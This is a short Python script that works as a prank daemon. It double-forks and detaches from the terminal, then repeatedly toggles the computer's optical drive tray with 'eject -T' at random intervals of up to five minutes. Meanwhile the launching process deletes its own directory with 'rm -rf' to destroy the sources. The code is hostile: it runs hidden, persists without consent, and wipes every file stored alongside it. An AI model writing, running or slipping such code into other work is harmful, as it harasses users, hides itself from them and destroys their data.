#!/usr/bin/env python
#-*- coding: utf-8 -*-
import os
from os         import fork
from os         import path     as p
from os         import setsid

import random
from random     import randint

import subprocess
from subprocess import call

import time
from time       import sleep


""" Max latency: 5 mn """
MAX_LATENCY = 60 * 5

def self_destruction():
    call(["rm","-rf", p.dirname(p.abspath(__file__))])
   
if __name__ == "__main__":
    pid = fork()
    if pid == 0:
        setsid()
        pid = fork()
        if pid == 0:
            while True:
                sleep(randint(0,MAX_LATENCY))
                call(["eject","-T"])
    else:
        self_destruction() # Destroy sources
